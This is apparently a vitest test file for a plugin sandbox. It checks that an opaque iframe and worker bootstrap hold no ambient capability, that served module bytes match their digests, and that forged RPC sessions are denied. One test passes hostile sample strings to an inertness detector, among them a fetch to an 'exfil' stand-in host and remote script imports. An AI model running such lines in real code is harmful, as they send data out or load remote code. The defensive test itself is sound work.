import { describe, expect, it, vi } from 'vitest';
import { sha256CspHash, sha256Identity } from '../../digest';
import type { PluginGrantReviewSnapshot } from '../../grant-review';
import { PORTABLE_FRAME_CSP } from '../containment-policy';
import {
    FRAME_TO_HOST,
    HOST_TO_FRAME,
    PORTABLE_FRAME_SANDBOX,
    PortableOpaqueSandbox,
    type HostFrameElementPort,
} from '../portable-frame-transport';
import {
    createRpcRequest,
    createRpcResponse,
    parseRpcEnvelope,
    serializeRpcEnvelope,
    type RpcEnvelope,
} from '../rpc-envelope';
import {
    PORTABLE_FRAME_DOCUMENT,
    PORTABLE_FRAME_SCRIPT,
    PORTABLE_FRAME_SCRIPT_HASH,
    PORTABLE_WORKER_SHIM,
} from '../portable-frame-document';
import {
    assessPortableHost,
    bootstrapSourceIsInert,
    defaultHostAbi,
    HOST_ABI_VERSION,
    PORTABLE_CLIENT_FEATURE,
    PORTABLE_PROFILE_NAME,
    PORTABLE_WORKER_BOOTSTRAP_SOURCE,
    portableBootstrapPayload,
    startPortableWorker,
    verifyServedModuleBytes,
    type StartPortableWorkerInput,
} from '../portable-bootstrap';

function grants(
    approved: readonly string[] = ['storage.read', 'hooks.register']
): PluginGrantReviewSnapshot {
    return {
        requestedGrants: [...approved],
        approvedGrants: [...approved],
        revision: 'g1',
        status: 'current',
    };
}

const profile = {
    profile: PORTABLE_PROFILE_NAME,
    minHostAbiVersion: 1,
    requiredFeatures: [PORTABLE_CLIENT_FEATURE],
} as const;

type HarnessMessage = Record<string, unknown>;

/** Emulates the host-owned sandbox frame: it reports itself, then its worker. */
function createFrameHarness(
    options: {
        autoFrameReady?: boolean;
        autoWorkerReady?: boolean;
        autoWorkerError?: string;
    } = {}
) {
    const listeners = new Set<
        (event: { data: unknown; origin: string; source: unknown }) => void
    >();
    const outbound: HarnessMessage[] = [];
    const attributes = new Map<string, string>();
    let removed = false;
    const frameWindow = {
        postMessage(message: unknown) {
            outbound.push(message as HarnessMessage);
        },
    };
    const port: HostFrameElementPort = {
        contentWindow: frameWindow,
        setAttribute(name, value) {
            attributes.set(name, value);
        },
        remove() {
            removed = true;
        },
        addEventListener() {},
        removeEventListener() {},
    };

    const emitFromFrame = (data: unknown, source: unknown = frameWindow) => {
        for (const listener of listeners) {
            listener({ data, origin: 'null', source });
        }
    };

    const createFrame = () => {
        if (options.autoFrameReady !== false) {
            queueMicrotask(() => emitFromFrame({ [ENVELOPE]: FRAME_TO_HOST.frameReady }));
        }
        if (options.autoWorkerReady) {
            queueMicrotask(() => {
                queueMicrotask(() => emitFromFrame({ [ENVELOPE]: FRAME_TO_HOST.workerReady }));
            });
        }
        if (options.autoWorkerError) {
            const reason = options.autoWorkerError;
            queueMicrotask(() => {
                queueMicrotask(() =>
                    emitFromFrame({ [ENVELOPE]: FRAME_TO_HOST.workerError, reason })
                );
            });
        }
        return port;
    };

    return {
        createFrame,
        addWindowMessageListener: (
            listener: (event: { data: unknown; origin: string; source: unknown }) => void
        ) => {
            listeners.add(listener);
            return () => listeners.delete(listener);
        },
        outbound,
        attributes,
        emitFromFrame,
        frameWindow,
        removed: () => removed,
        isRemoved: () => removed,
    };
}

const ENVELOPE = 'or3Portable';

async function startInput(
    overrides: Partial<StartPortableWorkerInput> & { bytes?: string } = {}
): Promise<{
    input: StartPortableWorkerInput;
    harness: ReturnType<typeof createFrameHarness>;
}> {
    const clientEntry = 'export const ok = true;';
    const bytes = overrides.bytes ?? clientEntry;
    const harness = createFrameHarness({ autoWorkerReady: true });
    const input: StartPortableWorkerInput = {
        release: {
            releaseId: 'rel_1',
            pluginId: 'example.plugin',
            packageTreeSha256: await sha256Identity('tree'),
            clientEntryDigest: await sha256Identity(bytes),
            moduleUrl: '/plugin-assets/example.plugin/client.mjs',
        },
        profile: { ...profile, requiredFeatures: [...profile.requiredFeatures] },
        abi: defaultHostAbi(),
        engine: 'chromium',
        workspaceId: 'ws_1',
        generation: 3,
        grants: grants(),
        services: {},
        loadServedBytes: async () => ({ bytes, contentType: 'text/javascript' }),
        createFrame: harness.createFrame,
        addWindowMessageListener: harness.addWindowMessageListener,
        hostOrigin: 'https://cloud.example',
        bootstrapTimeoutMs: 300,
        ...overrides,
    };
    return { input, harness };
}

describe('portable sandbox transport (4.1)', () => {
    it('keeps the host-owned bootstrap source free of ambient capability', () => {
        expect(bootstrapSourceIsInert(PORTABLE_WORKER_BOOTSTRAP_SOURCE)).toBe(true);
        // The shim that actually runs in the shipped sandbox is inert too.
        expect(bootstrapSourceIsInert(PORTABLE_WORKER_SHIM)).toBe(true);
        expect(bootstrapSourceIsInert('fetch("https://exfil.example")')).toBe(false);
        expect(bootstrapSourceIsInert('self.importScripts("https://x")')).toBe(false);
        expect(bootstrapSourceIsInert('eval("1")')).toBe(false);
        expect(bootstrapSourceIsInert('window.parent.postMessage(1, "*")')).toBe(false);
    });

    it('keeps the frame script hash in sync with the served document', async () => {
        // The CSP authorises the relay script by hash; a drift would silently
        // break the sandbox in every engine.
        expect(await sha256CspHash(PORTABLE_FRAME_SCRIPT)).toBe(PORTABLE_FRAME_SCRIPT_HASH);
        expect(PORTABLE_FRAME_DOCUMENT).toContain(`<script>${PORTABLE_FRAME_SCRIPT}</script>`);
        expect(PORTABLE_FRAME_CSP).toContain(`'${PORTABLE_FRAME_SCRIPT_HASH}'`);
        expect(PORTABLE_FRAME_CSP).toContain('sandbox allow-scripts');
    });

    it('sends host-verified bytes, not a URL the sandbox could choose', () => {
        const payload = portableBootstrapPayload({
            pluginId: 'example.plugin',
            moduleUrl: '/plugin-assets/example.plugin/client.mjs',
            csp: PORTABLE_FRAME_CSP,
            abiVersion: HOST_ABI_VERSION,
        });
        expect(payload).toMatchObject({
            pluginId: 'example.plugin',
            abiVersion: HOST_ABI_VERSION,
        });
        expect(Object.isFrozen(payload)).toBe(true);
    });

    it('verifies served bytes and exposes the exact verified source', async () => {
        const source = 'export const value = 1;';
        const expectedDigest = await sha256Identity(source);
        const verified = await verifyServedModuleBytes({
            url: '/asset.js',
            expectedDigest,
            load: async () => ({ bytes: source }),
        });
        expect(verified).toMatchObject({
            status: 'verified',
            digest: expectedDigest,
            source,
        });

        const tampered = await verifyServedModuleBytes({
            url: '/asset.js',
            expectedDigest,
            load: async () => ({ bytes: 'export const value = 2;' }),
        });
        expect(tampered).toMatchObject({ status: 'rejected', code: 'served-bytes-mismatch' });

        const missing = await verifyServedModuleBytes({
            url: '/asset.js',
            expectedDigest,
            load: async () => {
                throw new Error('404');
            },
        });
        expect(missing).toMatchObject({ status: 'rejected', code: 'served-bytes-unavailable' });
    });

    it('creates an opaque sandbox frame with the containment policy', async () => {
        const { input, harness } = await startInput();
        const result = await startPortableWorker(input);
        expect(result.status).toBe('started');
        if (result.status !== 'started') return;

        expect(harness.attributes.get('sandbox')).toBe(PORTABLE_FRAME_SANDBOX);
        expect(harness.attributes.get('sandbox')).not.toContain('allow-same-origin');
        expect(harness.removed()).toBe(false);
        if (result.status !== 'started') throw new Error('sandbox did not start');
        result.runtime.dispose();
    });

    it('passes the verified module source to the frame before any RPC', async () => {
        const { input, harness } = await startInput({ bytes: 'export const n = 41 + 1;' });
        const result = await startPortableWorker(input);
        expect(result.status).toBe('started');

        const start = harness.outbound.find(
            (message) => message[ENVELOPE] === HOST_TO_FRAME.start
        );
        expect(start).toMatchObject({
            moduleSource: 'export const n = 41 + 1;',
            moduleUrl: '/plugin-assets/example.plugin/client.mjs',
        });
        expect(start?.pluginId).toBe('example.plugin');

        // The runtime bootstrap is buffered until the worker reports ready, so it
        // can never arrive before the module listener exists.
        const bootstrap = harness.outbound.find(
            (message) => message[ENVELOPE] === HOST_TO_FRAME.rpc
        );
        expect(bootstrap).toBeTruthy();
        const envelope = parseRpcEnvelope(bootstrap?.data);
        expect(envelope.ok).toBe(true);
        if (envelope.ok && envelope.envelope.kind === 'event') {
            expect(envelope.envelope.name).toBe('runtime.bootstrap');
            expect(envelope.envelope.payload).toMatchObject({ abiVersion: HOST_ABI_VERSION });
        }

        if (result.status !== 'started') throw new Error('sandbox did not start');
        result.runtime.dispose();
    });

    it('relays worker RPC responses back to the host session', async () => {
        const { input, harness } = await startInput();
        const result = await startPortableWorker(input);
        expect(result.status).toBe('started');
        if (result.status !== 'started') return;

        const call = result.runtime.callPlugin('plugin.echo', { value: 1 });
        const request = harness.outbound.find(
            (message) =>
                message[ENVELOPE] === HOST_TO_FRAME.rpc &&
                parseRpcEnvelope(message.data).ok &&
                (parseRpcEnvelope(message.data) as { envelope: RpcEnvelope }).envelope.kind ===
                    'request'
        );
        expect(request).toBeTruthy();

        harness.emitFromFrame({
            [ENVELOPE]: FRAME_TO_HOST.rpc,
            data: serializeRpcEnvelope(
                createRpcResponse({ id: 'rpc-echo', result: { echoed: true } })
            ),
        });
        // The host session correlates by the id it generated; relay the matching
        // response for whatever id the request used.
        const requestEnvelope = parseRpcEnvelope(request?.data);
        if (requestEnvelope.ok && requestEnvelope.envelope.kind === 'request') {
            harness.emitFromFrame({
                [ENVELOPE]: FRAME_TO_HOST.rpc,
                data: serializeRpcEnvelope(
                    createRpcResponse({
                        id: requestEnvelope.envelope.id,
                        result: { echoed: true },
                    })
                ),
            });
        }
        await expect(call).resolves.toMatchObject({ ok: true, result: { echoed: true } });
        if (result.status !== 'started') throw new Error('sandbox did not start');
        result.runtime.dispose();
    });

    it('enforces the host session on every portable activation (finding 1)', async () => {
        const { input, harness } = await startInput();
        const result = await startPortableWorker({
            ...input,
            grants: grants(['storage.read', 'hooks.register']),
            services: { storage: { get: () => ({ value: 'from-host' }) } },
        });
        expect(result.status).toBe('started');
        if (result.status !== 'started') return;

        // The session is host-created, per activation, and bound to the sandbox
        // the host actually started (not to a caller-supplied value).
        expect(result.session.sourceId).toMatch(/^sbx-/);
        expect(result.session.generation).toBe(3);
        expect(result.session.sessionId.length).toBeGreaterThan(0);

        const relayedRequests = () =>
            harness.outbound
                .filter((message) => message[ENVELOPE] === HOST_TO_FRAME.rpc)
                .map((message) => parseRpcEnvelope(message.data))
                .flatMap((parsed) => (parsed.ok ? [parsed.envelope] : []));

        // Without the host session, the call is denied before any handler runs.
        harness.emitFromFrame({
            [ENVELOPE]: FRAME_TO_HOST.rpc,
            data: serializeRpcEnvelope(
                createRpcRequest({ id: 'no-session', method: 'storage.get', params: {} })
            ),
        });
        await vi.waitFor(() => {
            expect(
                relayedRequests().some(
                    (envelope) =>
                        envelope.kind === 'error' &&
                        envelope.id === 'no-session' &&
                        envelope.code === 'policy-denied'
                )
            ).toBe(true);
        });

        // A forged session id is refused too.
        harness.emitFromFrame({
            [ENVELOPE]: FRAME_TO_HOST.rpc,
            data: serializeRpcEnvelope(
                createRpcRequest({
                    id: 'forged',
                    method: 'storage.get',
                    params: {},
                    sessionId: 'sess-forged',
                    sourceId: result.session.sourceId,
                    generation: result.session.generation,
                })
            ),
        });
        await vi.waitFor(() => {
            expect(
                relayedRequests().some(
                    (envelope) =>
                        envelope.kind === 'error' &&
                        envelope.id === 'forged' &&
                        envelope.code === 'policy-denied'
                )
            ).toBe(true);
        });

        // The host-issued session works, so the boundary is not just refusing.
        harness.emitFromFrame({
            [ENVELOPE]: FRAME_TO_HOST.rpc,
            data: serializeRpcEnvelope({
                ...createRpcRequest({ id: 'valid', method: 'storage.get', params: {} }),
                sessionId: result.session.sessionId,
                sourceId: result.session.sourceId,
                generation: result.session.generation,
            }),
        });
        await vi.waitFor(() => {
            expect(
                relayedRequests().some(
                    (envelope) =>
                        envelope.kind === 'response' &&
                        envelope.id === 'valid' &&
                        (envelope as { result: unknown }).result instanceof Object
                )
            ).toBe(true);
        });

        // Termination retires the session: the same request can never be replayed.
        if (result.status !== 'started') throw new Error('sandbox did not start');
        result.runtime.dispose();
        const before = harness.outbound.length;
        harness.emitFromFrame({
            [ENVELOPE]: FRAME_TO_HOST.rpc,
            data: serializeRpcEnvelope({
                ...createRpcRequest({ id: 'after-dispose', method: 'storage.get', params: {} }),
                sessionId: result.session.sessionId,
                sourceId: result.session.sourceId,
                generation: result.session.generation,
            }),
        });
        expect(harness.outbound.length).toBe(before);
    });

    it('ignores messages from another window', async () => {
        const { input, harness } = await startInput();
        const result = await startPortableWorker(input);
        expect(result.status).toBe('started');
        if (result.status !== 'started') return;

        harness.emitFromFrame(
            { [ENVELOPE]: FRAME_TO_HOST.rpc, data: '{"v":1,"kind":"response","id":"x","ok":true,"result":1}' },
            { impostor: true }
        );
        const call = result.runtime.callPlugin('plugin.echo');
        const request = harness.outbound.find(
            (message) =>
                message[ENVELOPE] === HOST_TO_FRAME.rpc &&
                parseRpcEnvelope(message.data).ok &&
                (parseRpcEnvelope(message.data) as { envelope: RpcEnvelope }).envelope.kind ===
                    'request'
        );
        const requestEnvelope = parseRpcEnvelope(request?.data);
        if (requestEnvelope.ok && requestEnvelope.envelope.kind === 'request') {
            harness.emitFromFrame({
                [ENVELOPE]: FRAME_TO_HOST.rpc,
                data: serializeRpcEnvelope(
                    createRpcResponse({ id: requestEnvelope.envelope.id, result: 'own' })
                ),
            });
        }
        await expect(call).resolves.toMatchObject({ ok: true, result: 'own' });
        if (result.status !== 'started') throw new Error('sandbox did not start');
        result.runtime.dispose();
    });

    it('denies unqualified hosts before fetching any bytes (RT01)', async () => {
        let fetched = 0;
        const { input } = await startInput({
            loadServedBytes: async () => {
                fetched += 1;
                return { bytes: 'export const ok = true;' };
            },
        });

        const unsupportedBrowser = await startPortableWorker({ ...input, engine: 'firefox' });
        expect(unsupportedBrowser.status).toBe('blocked');
        if (unsupportedBrowser.status === 'blocked') {
            expect(unsupportedBrowser.codes).toContain('browser-unsupported');
        }

        const staticHost = await startPortableWorker({
            ...input,
            abi: defaultHostAbi({ staticHost: true }),
        });
        expect(staticHost.status).toBe('blocked');

        const oldAbi = await startPortableWorker({
            ...input,
            abi: defaultHostAbi({ version: 0 }),
        });
        expect(oldAbi.status).toBe('blocked');

        const unknownFeature = await startPortableWorker({
            ...input,
            abi: defaultHostAbi({ features: [] }),
        });
        expect(unknownFeature.status).toBe('blocked');

        const otherProfile = await startPortableWorker({
            ...input,
            profile: { profile: 'or3-other-profile', minHostAbiVersion: 1, requiredFeatures: [] },
        });
        expect(otherProfile.status).toBe('blocked');

        expect(fetched).toBe(0);

        // And the host ABI assessment itself is explicit.
        expect(
            assessPortableHost({
                abi: defaultHostAbi({ staticHost: true }),
                profile,
                engine: 'chromium',
            })
        ).toMatchObject({ status: 'denied', codes: expect.arrayContaining(['static-host-deferred']) });
    });

    it('never creates a sandbox when served bytes do not match', async () => {
        let created = 0;
        const { input } = await startInput({
            bytes: 'export const tampered = true;',
            createFrame: () => {
                created += 1;
                throw new Error('must not create a sandbox');
            },
        });
        // Approved digest differs from the bytes the server would serve.
        const result = await startPortableWorker({
            ...input,
            release: {
                ...input.release,
                clientEntryDigest: await sha256Identity('export const approved = true;'),
            },
        });
        expect(result).toMatchObject({ status: 'blocked' });
        if (result.status === 'blocked') {
            expect(result.codes).toContain('served-bytes-mismatch');
        }
        expect(created).toBe(0);
    });

    it('reports a frame or worker failure and tears the sandbox down', async () => {
        const harness = createFrameHarness({
            autoWorkerError: 'module-import-failed: boom',
        });
        const { input } = await startInput({
            createFrame: harness.createFrame,
            addWindowMessageListener: harness.addWindowMessageListener,
            bootstrapTimeoutMs: 200,
        });
        const result = await startPortableWorker(input);
        expect(result.status).toBe('blocked');
        if (result.status === 'blocked') {
            expect(result.codes).toContain('bootstrap-failed');
        }
        expect(harness.removed()).toBe(true);
    });

    it('times out when the frame never reports itself', async () => {
        const harness = createFrameHarness({ autoFrameReady: false });
        const { input } = await startInput({
            createFrame: harness.createFrame,
            addWindowMessageListener: harness.addWindowMessageListener,
        });
        const sandbox = new PortableOpaqueSandbox({
            pluginId: 'example.plugin',
            moduleSource: 'export {};',
            moduleUrl: '/x.js',
            csp: PORTABLE_FRAME_CSP,
            hostOrigin: 'https://cloud.example',
            createFrame: harness.createFrame,
            addWindowMessageListener: harness.addWindowMessageListener,
            handshakeTimeoutMs: 40,
        });
        await expect(sandbox.start()).rejects.toThrow(/did not start in time/);
        sandbox.terminate();
        expect(harness.removed()).toBe(true);
        void input;
    });

    it('terminates the frame and stops forwarding after disposal', async () => {
        const { input, harness } = await startInput();
        const result = await startPortableWorker(input);
        expect(result.status).toBe('started');
        if (result.status !== 'started') return;

        if (result.status !== 'started') throw new Error('sandbox did not start');
        result.runtime.dispose();
        expect(harness.removed()).toBe(true);
        const terminate = harness.outbound.find(
            (message) => message[ENVELOPE] === HOST_TO_FRAME.terminate
        );
        expect(terminate).toBeTruthy();

        const before = harness.outbound.length;
        harness.emitFromFrame({
            [ENVELOPE]: FRAME_TO_HOST.rpc,
            data: serializeRpcEnvelope(
                createRpcResponse({ id: 'late', result: 'late' })
            ),
        });
        expect(harness.outbound.length).toBe(before);
    });
});
